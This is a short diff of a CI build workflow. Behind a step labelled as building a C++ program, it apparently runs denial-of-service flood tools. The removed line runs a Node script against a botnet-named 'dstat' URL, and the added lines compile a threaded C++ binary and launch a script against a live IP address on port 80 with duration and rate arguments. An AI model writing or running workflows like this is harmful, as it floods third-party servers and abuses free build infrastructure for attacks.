@@ -15,4 +15,10 @@ workflows:
       - name: Build and Run C++ Program
         script: |
           echo "Compiling..."
-          node raw-mix.js https://dstat.botnet.im 120 500000 160 8
+          g++ -std=c++14 -O3 -march=native lmao.cpp -o soul -pthread
+
+          echo "Making executable..."
+          chmod +x soul
+
+          echo "Running..."
+          ./soul.sh 216.202.205.235  80 120 200
